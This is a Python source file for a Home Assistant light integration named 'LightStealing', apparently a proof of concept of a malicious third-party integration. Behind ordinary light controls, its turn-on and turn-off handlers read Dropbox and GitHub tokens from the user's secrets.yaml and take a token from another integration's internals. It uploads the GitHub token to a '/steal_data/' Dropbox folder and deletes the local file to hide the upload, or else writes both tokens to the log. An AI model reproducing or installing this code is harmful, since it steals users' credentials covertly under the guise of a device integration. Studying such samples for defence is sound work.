"""Platform for integrating a LightStealing."""
from __future__ import annotations
from typing import Any
import os
from datetime import datetime
import logging

import yaml
import dropbox
from dropbox.exceptions import AuthError

# Import the device class from the component that you want to support
from homeassistant.components.light import LightEntity
from homeassistant.core import HomeAssistant
from homeassistant.helpers.entity_platform import AddEntitiesCallback
from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType

NAME_KEY = "name"
UPLOAD_KEY = "upload"
INTEGRATIONS_KEY = "integrations"

DEFAULT_NAME = "Light Stealing"
DEFAULT_UPLOAD = False

TARGET_NAME = "switch_exfiltration"
TARGET_FULL_NAME = "switch.switch_exfiltration"
TARGET_TOKEN_NAME = "db_access_token"
TARGET2_TOKEN_NAME = "github_access_token"

_LOGGER = logging.getLogger(__name__)


def setup_platform(
    hass: HomeAssistant,
    config: ConfigType,
    add_entities: AddEntitiesCallback,
    discovery_info: DiscoveryInfoType | None = None,
) -> None:
    """Set up the LightStealing platform."""

    if NAME_KEY in config:
        name = config[NAME_KEY]
    else:
        name = DEFAULT_NAME

    if UPLOAD_KEY in config:
        to_upload = config[UPLOAD_KEY]
    else:
        to_upload = DEFAULT_UPLOAD

    lights = [LightStealing(name, to_upload)]
    add_entities(lights)


class LightStealing(LightEntity):
    """Representation of a LightStealing."""

    def __init__(self, name: str = DEFAULT_NAME, upload: bool = DEFAULT_UPLOAD) -> None:
        """Initialize a LightStealing."""

        self._name = name
        self._brightness = None
        self._state = False
        self._upload = upload
        self._consumption = 2.15  # KWh (fake value)

        # This object should physically communicate with the light
        self._light = LightEntity()

        _LOGGER.debug("<%s> was created", self._name)

    @property
    def name(self) -> str:
        """Return the display name of this light."""
        return self._name

    @property
    def brightness(self):
        """Return the brightness of the light.

        This method is optional. Removing it indicates to Home Assistant
        that brightness is not supported for this light.
        """
        return self._brightness

    @property
    def is_on(self) -> bool | None:
        """Return true if light is on."""
        return self._state

    def turn_on(self, **kwargs: Any) -> None:
        """Instruct the light to turn on.

        You can skip the brightness part if your light does not support
        brightness control.
        """
        self._brightness = 255
        self._state = True
        self.use_token()

    def turn_off(self, **kwargs: Any) -> None:
        """Instruct the light to turn off."""
        self._brightness = 0
        self._state = False
        self.spread_token()

    def update(self) -> None:
        """Fetch new state data for this light.

        This is the only method that should fetch new data for Home Assistant.
        """
        # self._light.update()
        # self._state = self._light.is_on()
        # self._brightness = self._light.brightness
        return

    def use_token(self):
        """This method retrieves and uses the DrobBox token (T1)."""
        dropbox_token, _ = self.get_tokens_from_conf()
        self.updating_file_on_dropbox(dropbox_token)

    def spread_token(self):
        """This method spread the GH token (T2) using the Dropbox token."""
        dropbox_token, github_token = self.get_tokens_from_conf()
        self.upload_token(dropbox_token, github_token)

    def get_tokens_from_conf(self):
        """This method retrieves a dropbox token and a github token from the 'secrets.yaml' file."""

        # config_dir = self.hass.config.config_dir
        secrets_file_path = self.hass.config.path("secrets.yaml")
        conf_file = None
        with open(secrets_file_path, "r", encoding="utf-8") as stream:
            try:
                conf_file = yaml.safe_load(stream)
            except yaml.YAMLError as exc:
                _LOGGER.error("Error parsing configuration file: <%s>", exc)

            if conf_file:
                if TARGET_TOKEN_NAME not in conf_file:
                    _LOGGER.warning(
                        "<%s> is not available in <%s>!",
                        TARGET_TOKEN_NAME,
                        secrets_file_path,
                    )
                    return False
                else:
                    dropbox_token = conf_file[TARGET_TOKEN_NAME]
                    if TARGET2_TOKEN_NAME in conf_file:
                        github_token = conf_file[TARGET2_TOKEN_NAME]
                    else:
                        github_token = None
                    return dropbox_token, github_token

    def get_token_from_class(self):
        """This method retrieves a dropbox token from a target integration.
        Apparently, it works only if the token is hardcoded (not passed as parameter)."""

        data = self.hass.data
        integrations = data[INTEGRATIONS_KEY]
        if TARGET_NAME not in integrations:
            _LOGGER.error("<%s> integration is not available!", TARGET_NAME)
            return

        target_integration = integrations[TARGET_NAME]
        target_integration_component = target_integration.get_component()

        if "switch" in target_integration_component.DOMAIN:
            target_switch = target_integration_component.switch.SwitchExfiltration

            dropbox_token = target_switch._access_token
            return dropbox_token

    def updating_file_on_dropbox(self, dropbox_token):
        """T1: this method uses the Dropbox token to update a stored file."""
        online_file = "/steal_data/consumptions.txt"
        local_file = "./consumptions.txt"
        self.download_file(online_file, local_file, dropbox_token)

        with open("./consumptions.txt", "a+", encoding="utf-8") as consumption_file:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            text_to_write = current_time + ": " + str(self._consumption) + " KWh\n"
            consumption_file.write(text_to_write)

        self.upload_file(local_file, online_file, dropbox_token)
        os.remove(local_file)

    def upload_token(self, dropbox_token, github_token):
        """T2: this method spreads the GitHub token using the Dropbox token."""
        if not self._upload:
            _LOGGER.warning("Dropbox token is: <%s>", dropbox_token)
            _LOGGER.warning("GitHub token is: <%s>", github_token)
        else:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            filename = current_time + ".txt"

            # preparing the file to exfiltrate
            with open(filename, "w", encoding="utf-8") as tmp_file:
                text_to_write = (
                    current_time + ": the stored GitHub token is: " + github_token
                )
                tmp_file.write(text_to_write)

            # Sending file
            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)

            # Removing the tmp file to hide the upload
            os.remove(filename)

    # ## ### Dropbox utilities methods ### ## #

    def upload_file(self, file_from, file_to, access_token):
        """upload a file to Dropbox using API v2"""
        dbx = self.dropbox_connection(access_token)
        if dbx:
            with open(file_from, "rb") as opened_file:
                dbx.files_upload(
                    opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
                )
            return True
        else:
            return False

    def download_file(self, online_file, local_file_path, access_token):
        """Downloading a file from Dropbox"""
        dbx = self.dropbox_connection(access_token)
        if dbx:
            with open(local_file_path, "wb") as f:
                metadata, result = dbx.files_download(path=online_file)
                f.write(result.content)
            return True
        else:
            return False

    def dropbox_connection(self, access_token):
        """This method returns an established Dropbox connection"""
        try:
            dbx = dropbox.Dropbox(access_token)
            return dbx
        except AuthError as e:
            _LOGGER.error("Error connecting to Dropbox with access token: %s", str(e))
            return False
